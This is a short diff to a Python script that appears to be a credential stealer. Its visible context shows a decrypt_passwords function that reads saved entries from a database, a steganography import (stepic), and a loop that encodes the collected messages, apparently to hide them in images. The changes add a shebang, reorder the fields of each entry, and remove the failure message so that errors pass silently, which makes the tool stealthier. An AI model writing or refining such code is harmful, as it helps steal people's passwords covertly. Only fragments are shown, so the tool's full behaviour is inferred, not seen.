@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 import glob
 from os import path, geteuid, remove
 import stepic
@@ -50,12 +52,11 @@ def decrypt_passwords():
 		savedlist = []
 		rows = cur.fetchall()
 		for row in rows:
-			savedlist.append([str(row[0]),str(row[1]),str(row[2])])		
+			savedlist.append([str(row[1]),str(row[0]),str(row[2])])		
 		for entry in savedlist:
 			msglist.append(format_msg(entry))
 		remove(temp_path)		
 	except:
-		print "Fail"
 		pass
 	#print msglist
 	return msglist
@@ -228,4 +229,3 @@ while True:
 			num_encoded = encode_run(msglist,update_dt)
 		
 			
-
